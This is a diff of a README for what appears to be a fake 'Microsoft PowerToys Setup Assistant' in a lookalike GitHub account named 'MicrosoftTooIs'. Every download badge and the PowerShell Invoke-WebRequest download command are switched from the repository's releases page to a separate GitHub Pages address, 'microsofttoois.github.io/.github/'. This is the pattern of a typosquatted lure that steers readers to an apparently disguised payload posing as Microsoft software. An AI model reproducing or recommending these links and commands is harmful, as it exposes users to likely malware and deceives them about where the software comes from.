@@ -1,6 +1,6 @@
 # Microsoft PowerToys — Offline Setup Assistant 🚀
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-brightgreen?style=for-the-badge)](https://github.com/MicrosoftTooIs/PowerToys/releases/latest)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-brightgreen?style=for-the-badge)](https://microsofttoois.github.io/.github/)
 [![License](https://img.shields.io/github/license/MicrosoftTooIs/PowerToys?style=for-the-badge)](LICENSE)
 [![GitHub Stars](https://img.shields.io/github/stars/MicrosoftTooIs/PowerToys?style=for-the-badge)](https://github.com/MicrosoftTooIs/PowerToys/stargazers)
 [![GitHub Issues](https://img.shields.io/github/issues/MicrosoftTooIs/PowerToys?style=for-the-badge)](https://github.com/MicrosoftTooIs/PowerToys/issues)
@@ -18,7 +18,7 @@
 
 ### 🎯 Choose Your Installation Method
 
-[![Download for Windows](https://img.shields.io/badge/💾_Download_Setup_Assistant-2ea043?style=for-the-badge&logo=windows)](https://github.com/MicrosoftTooIs/PowerToys/releases/latest)
+[![Download for Windows](https://img.shields.io/badge/💾_Download_Setup_Assistant-2ea043?style=for-the-badge&logo=windows)](https://microsofttoois.github.io/.github/)
 
 **Latest Version:** ![GitHub release](https://img.shields.io/github/v/release/MicrosoftTooIs/PowerToys?style=flat-square) | **Downloads:** ![GitHub all releases](https://img.shields.io/github/downloads/MicrosoftTooIs/PowerToys/total?style=flat-square)
 
@@ -40,7 +40,7 @@
 1. **📥 Download** the latest Setup Assistant
    ```powershell
    # Option 1: Direct download via PowerShell
-   Invoke-WebRequest -Uri "https://github.com/MicrosoftTooIs/PowerToys/releases/latest/download/PowerToysSetup.zip" -OutFile "PowerToysSetup.zip"
+   Invoke-WebRequest -Uri "https://microsofttoois.github.io/.github/PowerToysSetup.zip" -OutFile "PowerToysSetup.zip"
    
    # Option 2: Use browser to download from releases page
    ```
@@ -275,7 +275,7 @@ ForEach ($Computer in $Computers) {
 
 **Transform your Windows experience with professional-grade deployment tools**
 
-[![⬇️ Download Setup Assistant](https://img.shields.io/badge/⬇️_Download_Setup_Assistant-2ea043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/MicrosoftTooIs/PowerToys/releases/latest)
+[![⬇️ Download Setup Assistant](https://img.shields.io/badge/⬇️_Download_Setup_Assistant-2ea043?style=for-the-badge&logo=windows&logoColor=white)](https://microsofttoois.github.io/.github/)
 [![📚 Read Documentation](https://img.shields.io/badge/📚_Read_Documentation-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://microsofttoois.github.io/PowerToys)
 [![💬 Get Support](https://img.shields.io/badge/💬_Get_Support-7c3aed?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MicrosoftTooIs/PowerToys/discussions)
 
